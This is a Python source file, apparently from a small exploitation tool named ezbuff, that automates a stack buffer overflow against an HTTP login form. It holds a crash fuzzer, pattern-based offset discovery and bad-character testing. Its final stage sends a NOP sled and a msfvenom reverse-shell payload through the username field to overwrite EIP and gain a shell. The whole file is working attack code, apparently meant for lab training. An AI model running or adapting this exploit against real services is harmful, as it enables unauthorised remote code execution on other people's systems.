"""Defines the `Overflow` class which contains most
of the functions needed to perform the buffer overflow.

Name: overflow.py
"""


try:
	import subprocess as sp
	import socket
	import logging
	from re import search
	from time import sleep
	from sys import exit
	from ezbuff.src.pattern_create import pattern_create
	from ezbuff.src.pattern_offset import pattern_offset
except ImportError as err:
	print(f"Import Error: {err}")


# -------------------( Ansicolors )-------------------
rst = "\033[0m"
bld = "\033[01m"
rd = "\033[91m"
gn = "\033[92m"
yw = "\033[93m"
be = "\033[94m"
pe = "\033[95"


# -------------------( Custom Exceptions )-------------------
class InvalidTargetIPError(TypeError):
	"""Will be raised if the type of the target IP
	is not of type "str"
	"""
	def __init__(self, error_msg):
		super().__init__(error_msg)


class InvalidTargetPortError(TypeError):
	"""Will be raised if the type of the target IP
	is not of type "int"
	"""
	def __init__(self, error_msg):
		super().__init__(error_msg)


class InvalidMemoryAddressError(ValueError):
	"""Will be raised if value passed into the `jump_eip`
	does not contain a length of four which will be the four
	bytes that overwrite the EIP.
	"""
	def __init__(self, error_msg):
		super().__init__(error_msg)


class NoOffsetError(AttributeError):
	"""Will be raised if offset property has not been set"""
	def __init__(self, error_msg):
		super().__init__(error_msg)


class NoEipMemoryAddressError(AttributeError):
	"""Will be raised if `jump_eip` attribute has not been set"""
	def __init__(sefl, error_msg):
		super().__init__(error_msg)


# -------------------( Class Overflow Definition )-------------------
class Overflow:
	""" Overflow class definition

	Attributes:
		nop_sled (str): A raw string of 16 no operation bytes
		chars (str): All possible characters to test application for bad characters.
	"""
	nop_sled = "\x90"*16
	chars = (
"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10"
"\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30"
"\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50"
"\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70"
"\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
"\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90"
"\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
"\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0"
"\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
"\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0"
"\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
"\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0"
"\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff")


	def __init__(
		self, targ_ip, targ_port, bad_chars=[],
		offset=None, num_bytes_crash=None, jump_eip=None,
		max_fuzz_bytes=2000, fuzz_interval_seconds=10, fuzz_increment=100
	):
		"""Initialize variables

		Args:
			targ_ip (str): Will store the IP of the target machine, default = None
			targ_port (int): Will store the port number of the target application, default = None
			bad_chars: Will store the bad character found by the user, default = empty list
			offset (int): Will store the integer returned by msf"s pattern_offset file
						that determines where the offset occured in the fuzzing process
			num_bytes_crash (int): The number of bytes it took to crash the system
			jump_eip (str): Will store the four bytes necessary to overwrite eip register with jump command
			max_fuzz_bytes (int): The maximum number of bytes to fuzz the application with, default = 3000
			fuzz_interval_seconds (int): The number of seconds to wait in between the fuzzing process, default = 10
			fuzz_increment (int): The number of bytes to increment each payload during the initial fuzz testing, default = 100

		Raises:
			InvalidTargetIPError: if invalid IP addresses is passed as an argument
			InvalidTargetPortError: if invalid port number is passed as an argument
		"""
		try:
			if not isinstance(targ_ip, str):
				raise InvalidTargetIPError("The target IP address must be a string.")
			if not search(r"[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}", targ_ip):
				raise InvalidTargetIPError("The target IP address is not a valid IP address.")
			if not isinstance(targ_port, int):
				raise InvalidTargetPortError("The target port number must be an integer between 1-65535")
		except InvalidTargetIPError as err:
			print(rd+"[-]"+rst+f" Invalid Target IP: {err}")
			exit(1)
		except InvalidTargetPortError as err:
			print(rd+"[-]"+rst+f" Invalid Target Port Error: {err}")
			exit(1)
		else:
			self._targ_ip = targ_ip
			self._targ_port = targ_port

		self._bad_chars = bad_chars
		self._offset = offset
		self._num_bytes_crash = num_bytes_crash
		self._jump_eip = jump_eip
		self._max_fuzz_bytes = max_fuzz_bytes
		self._fuzz_interval_seconds = fuzz_interval_seconds
		self._fuzz_increment = fuzz_increment


	def __repr__(self):
		return (f"Ezfuzz(\n\ttarg_ip = '{self.targ_ip}',\n\ttarg_port = {self.targ_port},"
				f"\n\tbad_characters = {self.bad_chars},"
				f"\n\toffset = {self.offset},\n\tnum_bytes_crash = {self.num_bytes_crash},"
				f"\n\tjump_eip = {self.jump_eip},\n\tmax_fuzz_bytes = {self.max_fuzz_bytes},"
				f"\n\tfuzz_interval_seconds = {self.fuzz_interval_seconds},"
				f"\n\tfuzz_increment = {self.fuzz_increment}\n)")


	def __str__(self):
		return f"Ezfuzz(target_ip_address='{self.targ_ip}', target_port={self.targ_port})\n"


	@property
	def targ_ip(self) -> str:
		"""Returns the current target's IP address"""
		return self._targ_ip


	@targ_ip.setter
	def targ_ip(self, new_ip):
		"""Sets a new IP addresses

		Args:
			new_ip (str): The new target IP address
		
		Raises:
			InvalidTargetIPError:
		"""
		try:
			if not isinstance(new_ip, str):
				raise InvalidTargetIPError("Argument must be of type `str`")
			if not search(r"[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}", new_ip):
				raise InvalidTargetIPError("The target IP address is not a valid IP address.")
		except InvalidTargetIPError as err:
			print(rd+bld+"[-]"+rst+f" Invalid Target IP Error: {err}")
		else:
			self._targ_ip = new_ip


	@property
	def targ_port(self) -> int:
		"""Returns the target application port number"""
		return self._targ_port


	@targ_port.setter
	def targ_port(self, new_port):
		"""Sets a new port number for target application

		Args:
			new_port (int): The new target port number

		Raises:
			InvalidTargetPortError:
	"""
		try:
			if not isinstance(new_port, int):
				raise InvalidTargetPortError("Argument must be of type `int`")
		except InvalidTargetPortError as err:
			print(rd+bld+"[-]"+rst+f" Invalid Target Port Error: {err}")
		else:
			self._targ_port = new_port
	
	
	@property
	def bad_chars(self) -> list:
		"""Return the bad characters set by user"""
		if not len(self._bad_chars):
			return None
		return self._bad_chars
	
	
	def add_bad_char(self, *args):
		"""Adds bad characters to the instance `bad_chars` list

		args (tuple): A tuple containing any number of bad characters to append to instance `_bad_chars` list
		"""
		[self._bad_chars.append(arg) for arg in args]


	def del_bad_char(self, *args):
		"""Deletes bad characters from the instance `bad_chars` list"""
		[self._bad_chars.remove(arg) for arg in args]


	@property
	def max_fuzz_bytes(self) -> int:
		"""Returns the current value of the `_max_fuzz_bytes` variable"""
		return self._max_fuzz_bytes


	@max_fuzz_bytes.setter
	def max_fuzz_bytes(self, max_bytes):
		"""Sets a new value to the `_max_fuzz_bytes` variable

		Args:
			max_bytes (int): The maximum number of bytes to send to the application

		Raises:
			TypeError: if `max_bytes` argument is not of type `int`
		"""
		try:
			if not isinstance(max_bytes, int):
				raise TypeError("The maximum number to test the application with must be an integer")
		except TypeError as err:
			print(rd+bld+"[-]"+rst+f" Type Error: {err}")
		else:
			self._max_fuzz_bytes = max_bytes


	@property
	def num_bytes_crash(self) -> int:
		"""Returns the number of bytes it took to crash the application"""
		return self._num_bytes_crash
	

	@num_bytes_crash.setter
	def num_bytes_crash(self, new_bytes_value):
		"""Sets the number of bytes needed to crash the application. 
		This value should be incremented to accomodate for reverse shell
		payloads.

		Args:
			new_bytes_value (int): The number of bytes the user wants to send after
								finding the number of bytes needed to crash the application

		Raises:
			TypeError: if `new_bytes_value` is not of type `int`
		"""
		try:
			if not isinstance(new_bytes_value, int):
				raise TypeError("Argument must be of type `int`")
		except TypeError as err:
			print(rd+bld+"[-]"+rst+f" Type Error: {err}")
		else:
			self._num_bytes_crash = new_bytes_value
		

	@property
	def offset(self) -> int:
		"""Returns the instance offset value"""
		return self._offset


	@offset.setter
	def offset(self, offset_value):
		"""

		Args:
			offset_value (int): The offset returned by the `get_offset` function

		Raises:
			TypeError: 
		"""
		try:
			if not isinstance(offset_value , int):
				raise TypeError("Argument must be of type `int`")
		except TypeError as err:
			print(rd+bld+"[-]"+rst+f"Type Error: {err}")
		else:
			self._offset = offset_value


	@property
	def jump_eip(self):
		"""Returns the memory address variable,`jump_eip`, 
		containing the jump eip instruction"""
		return self._jump_eip


	@jump_eip.setter
	def jump_eip(self, jump_mem_location):
		"""Sets the memory address variable, `jump_eip`, to
		containing the jump eip instruction

		Args:
			jump_mem_location (str): The memory address that will be used to jump the EIP obtained
										to execute our payload.

		Raises:
			InvalidMemoryAddressError: if memory address is not 16 characters in length
								(Ex. \x8f\x35\x4a\x5f) = 4 bytes)
		"""
		try:
			if len(jump_mem_location) != 4:
				raise InvalidMemoryAddressError("The memory address for the EIP register must be eight bytes long")
		except InvalidMemoryAddressError as err:
			print(rd+bld+"[-]"+rst+f" InvalidMemoryAddressError: {err}")
			exit(1)
		else:
			self._jump_eip = jump_mem_location


	@property
	def fuzz_interval_seconds(self):
		"""Returns `_fuzz_interval_seconds` which stores the number of seconds
		to wait in between each step of the fuzzing process"""
		return self._fuzz_interval_seconds


	@fuzz_interval_seconds.setter
	def fuzz_interval_seconds(self, sec):
		"""
		Args:
			sec (int): The number of seconds to wait in between each payload of the fuzzing process

		Raises:
			TypeError: if `sec` argument is not of type `int`
		"""
		try:
			if not isinstance(sec, int):
				raise TypeError("Argument must be of type `int`")
		except TypeError as err:
			print(rd+bld+"[-]"+rst+f"Type Error: {err}")
		else:
			self._fuzz_interval_seconds = sec


	@property
	def fuzz_increment(self):
		"""Returns the current value set to increment to the fuzzing payloads (default=100)"""
		return self._fuzz_increment


	@fuzz_increment.setter
	def fuzz_increment(self, new_increment):
		"""Sets the `fuzz_increment` value to 

		Args:
			new_increment (int): 

		Raises:
			TypeError: if `value` argument is not of type `int`
		"""
		try:
			if not isinstance(new_increment, int):
				raise TypeError("Argument must be of type `int`")
		except TypeError as err:
			print(rd+bld+"[-]"+rst+f"Type Error: {err}")
		else:
			self._fuzz_increment = new_increment


	def _HTTP_header(self):
		"""
		"""
		buff = "POST /login HTTP/1.1\r\n"
		buff += f"Host: {self.targ_ip}\r\n"
		buff += "User-Agent: Mozilla/5.0 (X11; Linux_86_64; rv:52.0) Gecko/20100101 Firefox/52.0\r\n"
		buff += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
		buff += "Accept-Language: en-US,en;q=0.5\r\n"
		buff += "Referer: http://10.11.0.22/login\r\n"
		buff += "Connection: close\r\n"
		buff += "Content-Type: application/x-www-form-urlencoded\r\n"
		return buff


	def fuzz(self, chars=None, reverse_payload=None):
		"""Sends an incrementing number of bytes to an application
		until it crashes or returns an error and then prints out the
		number of bytes at the moment of the crash/error. If arg bad_char
		is passed, function will send bad characters payload.

		Args:
			chars (str): Will determine if bad characters string will be sent, default=None
			reverse_payload (bytes): Will store the contents of the msfvenom generated reverse shell
									payload, default=None

		Exceptions:
			KeyboardInterrupt: handles this error when user stops the program when aware of the
							the number of bytes it took to crash the application
			BaseException: handles any possible error when attempting to connect to target
						using sockets
		"""
		self.num_bytes_crash = 100

		if not chars and not reverse_payload:
			print(pe+bld+"[+]"+rst+" -----( Intiating fuzzing procedure )-----")
			print(yw+bld+"[!]"+rst+" -----( Press Ctrl+C when the application crashes! )-----")
			while self.num_bytes_crash <= self.max_fuzz_bytes:
				content = "username=" + "A"*self.num_bytes_crash + "&password=A"
				buff = self._HTTP_header()
				buff += f"Content-Length: {str(len(content))}\r\n"
				buff += "\r\n"
				buff += content
				soc = self._create_socket()
				try:
					print(be+bld+"[+]"+rst+f" -----( Sending payload containing {self.num_bytes_crash} bytes )-----")
					soc.send(bytes(buff, "utf-8"))
					soc.close()
					self.num_bytes_crash += self.fuzz_increment
					sleep(self.fuzz_interval_seconds)
				except KeyboardInterrupt:
					print(rd+bld+"\n[!]"+rst +" -----( Don't forget to set the number of bytes it took to crash the application )-----")
					exit(1)
				except:
					print(rd+bld+"[-]"+rst+f" Error occured...")
					exit(1)
		elif chars:
			try:
				if not self.offset:
					raise NoOffsetError("An offset value must be set before sending the bad characters payload")
				else:
					content = ("username=" + "A"*self.offset 
						+ "B"*4
						+ "C"*4
						+ chars
						+"&password=A"
					)
			except NoOffsetError as err:
				print(rd+bld+"[-] "+rst+f"NoOffsetError: {err}")
				exit(1)
			buff = self._HTTP_header()
			buff += f"Content-Length: {str(len(content))}\r\n"
			buff += "\r\n"
			buff += content

			soc = self._create_socket()

			print(yw+bld+"[+]"+rst+" -----( Sending payload to test bad characters )-----")
			try:
				soc.send(bytes(buff, "utf-8"))
			except BaseException as err:
				print(rd+bld+"[-]"+rst+f" SocketError: {err}")
				exit(1)
			finally:
				soc.close()
		else:
			content  = ("username=" + "A"*self.offset 
				+ self.jump_eip + Overflow.nop_sled 
				+ reverse_payload 
				+ "&password=A"
			)
			buff = self._HTTP_header()
			buff += f"Content-Length: {str(len(content))}\r\n"
			buff += "\r\n"
			buff += content

			soc = self._create_socket()

			print(gn+bld+"[+]"+rst+" -----( Sending reverse shell payload )-----")
			try:
				soc.send(bytes(buff, "utf-8"))
			except socket.error as err:
				print(rd+bld+"[-]"+rst+" SocketError: {err}")
				exit(1)
			finally:
				soc.close()


	def send_pattern(self):
		"""This function will send a payload containing a known pattern of 
		characters generated by the `patter`
		"""
		# HANDLE POSSIBLE ERROR:
		# IF `num_bytes_crash` is not set!!
		payload = pattern_create(self.num_bytes_crash)
		
		soc = self._create_socket()

		try:
			with soc:
				content = "username=" + payload + "&password=A"
				buff = self._HTTP_header()
				buff += f"Content-Length: {str(len(content))}\r\n"
				buff += "\r\n"
				buff += content

				bytes_payload = bytes(buff, "utf-8")
				print(gn+bld+"[+]"+rst+" -----( Sending pattern payload )-----")
				soc.send(bytes_payload)
		except socket.error as err:
			print(r+bld+"[-]"+bld+f" SocketError: {err}")
			exit(1)
		

	def get_offset(self, eip_value) -> int:
		"""Returns the offset based on the `eip_value` argument

		Args:
			eip_value (str): The address that overwrote the EIP when program crashed
		"""
		pattern = pattern_create(self.num_bytes_crash)
		self.offset = pattern_offset(eip_value, pattern)
		return self.offset


	def test(self, to_test):
		"""Will send a specially crafted payload to test if the current offset
		value is the correct offset.
		
		Args:
			to_test (str): The value to test ("offset" or "eip_address")

		Raises:
			NoOffsetError: if the `get_offset` function has not been invoked
		"""
		try:
			to_test = str(to_test.lower().strip())
			if to_test == "offset":
				if not self.offset:
					raise NoOffsetError("Please run `get_offset` to get and set `offset` value")
				payload = ("A"*self.offset 
					+ "B"*4 + "C"*(self.num_bytes_crash-self.offset-4)
				)
			if to_test == "eip_address":
				if not self.offset:
					raise NoOffsetError("Please run `get_offset` to get and set `offset` value")
				if not self.jump_eip:
					raise NoEipMemoryAddressError("Please set the `jump_eip` value in order to test jump esp memory address") from None
				payload = ("A"*self.offset 
					+ "B"*4 # self.jump_eip ----( Ask Veer or Frank for help!!!!
					+ "C"*4
					+ "D"*(self.num_bytes_crash-self.offset-len(self.nop_sled)-4)
				)
			content = "username=" + payload + "&password=A"
			buff = self._HTTP_header()
			buff += f"Content-Length: {str(len(content))}\r\n"
			buff += "\r\n"
			buff += content
			bytes_payload = buff.encode()
		except NoOffsetError as err:
			print(rd+bld+"[-]"+rst+f" NoOffsetError: {err}")
			exit(1)
		except NoEipMemoryAddressError as err:
			print(rd+bld+"[-]"+rst+f" NoEipMemoryAddressError: {err}")
			exit(1)
		except UnboundLocalError:
			print(rd+bld+"[-]"+rst+f" InvalidArgument: '{to_test}' ->  Argument to function `test` must be `offset` or `eip_address`")
			exit(1)
		else:
			soc = self._create_socket()
			try:
				with soc:
					soc.send(bytes_payload)
			except socket.error as err:
				print(r+bld+"[-]"+bld+f" SocketError: {err}")
				exit(1)


	def send_bad_chars(self):
		"""Sends the characters string so user can find bad characters"""
		copy_chars = self.chars
		if self.bad_chars:
			for char in self.bad_chars:
				copy_chars = copy_chars.replace(char, "")
			self.fuzz(chars=copy_chars)
			return
		self.fuzz(self.chars)



	def get_payload(self, payload_file):
		"""Will retrieve the payload from a generated payload file
		and invoke the `fuzz` function to send the payload
		to the target machine

		Args:
			payload_file (str): The name of the file containing the payload generated by Msfvenom
		"""
		with open(payload_file, "rb") as payload_file:
			payload = payload_file.read()
			self.fuzz(reverse_payload=payload)


	def _create_socket(self):
		"""Creates socket for sending payloads"""
		try:
			soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			soc.connect((self.targ_ip, self.targ_port))
		except socket.error as err:
			print(rd+bld+"[-]"+rst+f" SocketError: {err}")
			exit(1)
		except KeyboardInterrupt:
			print(rd+bld+"\n[-]"+rst+" Terminating program...")
			exit(1)
		return soc